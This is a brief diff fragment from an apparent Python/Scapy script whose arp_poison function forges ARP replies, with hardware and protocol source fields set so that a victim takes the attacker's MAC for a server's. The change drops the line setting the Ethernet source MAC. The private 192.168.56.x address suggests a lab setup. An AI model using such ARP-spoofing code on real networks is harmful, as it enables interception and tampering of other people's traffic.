@@ -4,7 +4,6 @@ ipAttacker = "192.168.56.103"
 def arp_poison(ipVictim, macVictim, ipServer, macAttacker, interface):
     print("poisoning")
     arp = Ether()/ARP()
-    arp[Ether].src = macAttacker
     arp[ARP].hwsrc = macAttacker
     arp[ARP].psrc = ipServer
     arp[ARP].hwdst = macVictim
